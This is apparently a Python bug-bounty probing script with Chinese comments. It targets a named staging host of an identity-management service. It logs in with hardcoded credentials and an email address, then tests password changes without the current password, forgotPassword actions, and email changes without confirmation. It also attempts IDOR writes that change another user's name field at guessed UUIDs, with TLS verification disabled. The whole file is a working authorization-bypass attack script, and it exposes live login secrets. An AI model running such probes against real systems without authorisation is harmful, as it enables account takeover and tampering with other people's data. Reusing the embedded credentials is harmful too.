# -*- coding: utf-8 -*-
"""AIC 第二十七轮:users action 接口——changePassword/forgotPassword + mail 确认密码 + PUT 他人
1. POST users/{id}?_action=changePassword(带/不带 currentPassword)
2. POST users/{id}?_action=forgotPassword
3. mail 修改带 confirmation password 的各种字段名尝试
4. PUT 他人(修 json= bug)——IDOR 写
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
ORIG_MAIL = '1643584176@qq.com'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                  'Content-Type': 'application/json'})
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = S.cookies.get('aa942d46ece12ce')
print('LOGIN OK')

S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643', 'Cookie': 'aa942d46ece12ce=' + tok,
                   'Content-Type': 'application/json', 'Accept-API-Version': 'resource=2.1, protocol=1.0'})

U = '/am/json/realms/root/realms/alpha/users/' + MY_ID

def probe(method, path, body=None, label=''):
    kw = {'timeout': 12, 'verify': False}
    if body is not None:
        kw['json'] = body
    try:
        r = S2.request(method, BASE + path, **kw)
        tag = ('  <= ' + label) if label else ''
        print('%-5s %-60s -> %d  %s%s' % (method, path[:60], r.status_code, r.text[:220].replace('\n', ' '), tag))
        return r
    except Exception as e:
        print('%-5s %-60s -> ERR %s' % (method, path[:60], str(e)[:60]))

def login_as(u, p):
    S3 = requests.Session()
    S3.trust_env = False
    S3.proxies = {'http': None, 'https': None}
    S3.headers.update({'User-Agent': 'x', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                       'Content-Type': 'application/json'})
    try:
        r = S3.post(AUTH, json={}, timeout=12, verify=False)
        d = r.json()
        cbs = []
        for cb in d.get('callbacks', []):
            t = cb['type']
            inp = [{'name': 'IDToken1', 'value': u}] if t == 'NameCallback' else \
                  [{'name': 'IDToken2', 'value': p}] if t == 'PasswordCallback' else \
                  [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
            cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
        r2 = S3.post(AUTH, json={'authId': d['authId'], 'callbacks': cbs}, timeout=12, verify=False)
        return r2.status_code, bool(r2.json().get('tokenId'))
    except Exception:
        return 0, False

print('=== 1. changePassword action ===')
probe('POST', U + '?_action=changePassword', {'currentPassword': PASS, 'userPassword': 'Temp1643$!'}, '正确当前密码')
print('  新密码登录:', login_as(USER, 'Temp1643$!'))
probe('POST', U + '?_action=changePassword', {'currentPassword': 'WRONG', 'userPassword': 'Temp1643$!'}, '错误当前密码')
print('  错误密码后登录(temp):', login_as(USER, 'Temp1643$!'))
probe('POST', U + '?_action=changePassword', {'userPassword': 'Temp1643$!'}, '无当前密码')
print('  无当前密码后登录(temp):', login_as(USER, 'Temp1643$!'))
probe('POST', U + '?_action=changePassword', {'oldPassword': PASS, 'newPassword': 'Temp1643$!'}, '字段名 old/new')
probe('POST', U + '?_action=changePassword', {'password': PASS, 'newPassword': 'Temp1643$!'}, '字段名 password/new')
# 恢复原密码
probe('POST', U + '?_action=changePassword', {'currentPassword': 'Temp1643$!' if login_as(USER, 'Temp1643$!')[1] else PASS,
                                              'userPassword': PASS}, '恢复原密码')
print('  恢复后原密码登录:', login_as(USER, PASS))

print('\n=== 2. forgotPassword action ===')
probe('POST', U + '?_action=forgotPassword', {}, '空 body')
probe('POST', U + '?_action=forgotPassword', {'mail': ORIG_MAIL}, '带 mail')
probe('POST', U + '?_action=forgotPassword', {'username': USER}, '带 username')
probe('POST', U + '?_action=forgotPassword', {'userName': USER}, '带 userName')

print('\n=== 3. mail 修改 + 确认密码字段名尝试 ===')
for body, lab in [
    ({'mail': ['t1643@test.com'], 'confirmationPassword': PASS}, 'confirmationPassword'),
    ({'mail': ['t1643@test.com'], 'userpassword': PASS}, 'userpassword'),
    ({'mail': ['t1643@test.com'], 'currentPassword': PASS}, 'currentPassword'),
    ({'mail': ['t1643@test.com'], 'password': PASS}, 'password'),
]:
    probe('PUT', U, body, 'mail+' + lab)
    r = S2.get(BASE + U, timeout=12, verify=False)
    cur_mail = r.json().get('mail') if r.status_code == 200 else '?'
    print('  当前 mail:', cur_mail)
    if cur_mail == ['t1643@test.com']:
        print('  [发现] mail 修改生效!恢复...')
        probe('PUT', U, {'mail': [ORIG_MAIL], 'confirmationPassword': PASS}, '恢复 mail')
        break

print('\n=== 4. PUT 他人(修 json bug) ===')
OTHER = 'db3d6356-61a0-4684-9eaa-c1353dfa44d8'
r = S2.put(BASE + '/am/json/realms/root/realms/alpha/users/' + OTHER,
           json={'givenName': ['idortest']}, timeout=12, verify=False)
print('PUT 他人邻近 UUID:', r.status_code, r.text[:200].replace('\n', ' '))
r = S2.put(BASE + '/am/json/realms/root/realms/alpha/users/00000000-0000-0000-0000-000000000000',
           json={'givenName': ['idortest']}, timeout=12, verify=False)
print('PUT 全0 UUID:', r.status_code, r.text[:200].replace('\n', ' '))

print('\n=== 5. 最终确认 ===')
r = S2.get(BASE + U, timeout=12, verify=False)
print('自己资料:', r.text[:250].replace('\n', ' '))
print('原密码登录:', login_as(USER, PASS))
